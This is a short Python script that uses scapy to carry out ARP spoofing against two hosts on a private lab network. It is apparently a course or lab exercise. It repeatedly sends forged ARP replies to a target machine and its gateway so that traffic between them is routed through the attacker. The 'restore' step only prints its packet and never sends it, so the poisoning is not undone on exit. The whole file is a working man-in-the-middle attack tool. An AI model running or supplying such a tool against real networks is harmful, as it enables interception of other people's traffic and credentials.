#!/usr/bin/env python

import scapy.all as scapy
import time
#python 2.7
#import sys

# op = request = 1, response = 2
# pdst = IP of target computer (IP destination target)
# hwdst = MAC of target machine (hardware destination target)
# psrc = Source IP of the packet being spoofed

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    print(packet.show())
    print(packet.summary())

restore("192.168.84.130", "192.168.84.2")

try:
    sent_packets_count = 0
    while True:
        spoof("192.168.84.130", "192.168.84.2")
        spoof("192.168.84.2", "192.168.84.130")
        sent_packets_count = sent_packets_count + 2
        #python 3
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")

        # python 2.7 or below
        #print("\r[+] Packets sent: " + str(sent_packets_count)),
        #sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Quitting.")


#get_mac("192.168.84.130")
#packet = scapy.ARP(op=2, pdst="192.168.84.130", hwdst="00:0c:29:94:d4:61", psrc="192.168.84.2")


#print(packet.show())
#print(packet.summary())